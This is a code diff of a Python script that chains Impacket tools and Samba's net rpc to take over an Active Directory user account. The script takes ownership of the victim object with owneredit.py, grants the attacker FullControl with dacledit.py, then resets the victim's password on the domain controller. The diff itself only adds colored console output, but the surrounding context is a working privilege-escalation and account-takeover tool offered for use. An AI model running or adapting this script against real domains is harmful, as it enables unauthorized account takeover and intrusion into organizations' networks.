@@ -2,6 +2,14 @@ import subprocess
 import argparse
 import os
 
+Bold='\033[1m'
+Red='\033[0;31m'
+Green='\033[0;32m'
+Blue='\033[0;94m'
+Yellow='\033[0;93m'
+Pink='\033[0;95m'
+NC='\033[0m' # No Color
+
 def run_command(command):
     """Runs a shell command and captures output."""
     try:
@@ -44,7 +52,7 @@ def main():
         return
 
     # Step 1: Change ownership of the victim's object
-    print("[+] Changing ownership of the target user...")
+    print(Green + "[+] Changing ownership of the target user..." + NC)
     owner_command = (
         f"owneredit.py -action write -new-owner '{args.attacker_user}' -target '{args.victim_user}' "
         f"'{args.domain}/{args.attacker_user}:{args.attacker_password}'"
@@ -52,7 +60,7 @@ def main():
     run_command(owner_command)
 
     # Step 2: Grant GenericAll permissions to the attacker
-    print("[+] Granting GenericAll permissions to the attacker...")
+    print(Green + "[+] Granting GenericAll permissions to the attacker..."+ NC)
     generic_all_command = (
         f"dacledit.py -action 'write' -rights 'FullControl' -principal '{args.attacker_user}' "
         f"-target '{args.victim_user}' '{args.domain}/{args.attacker_user}:{args.attacker_password}'"
@@ -60,7 +68,7 @@ def main():
     run_command(generic_all_command)
 
     # Step 3: Change the password of the victim user
-    print("[+] Changing the victim user's password...")
+    print(Green + "[+] Changing the victim user's password..."+ NC)
     password_change_command = (
         f"net rpc password '{args.victim_user}' '{args.new_password}' -U "
         f"'{args.domain}/{args.attacker_user}%{args.attacker_password}' -S '{args.domain_controller}'"
@@ -70,14 +78,14 @@ def main():
     # Optional: Cleanup - Remove GenericAll permissions
     cleanup = input("[?] Do you want to remove the added permissions? (yes/no): ").strip().lower()
     if cleanup == "yes":
-        print("[+] Removing GenericAll permissions...")
+        print(Green + "[+] Removing GenericAll permissions..."+ NC)
         cleanup_command = (
             f"dacledit.py -action 'remove' -rights 'FullControl' -principal '{args.attacker_user}' "
             f"-target '{args.victim_user}' '{args.domain}/{args.attacker_user}:{args.attacker_password}'"
         )
         run_command(cleanup_command)
 
-    print("[+] Process complete. Use the new password for further actions.")
+    print(f"{Green}[+] Process complete. Use the new password '{args.new_password} for user '{args.victim_user} for further actions.")
 
 if __name__ == "__main__":
     main()
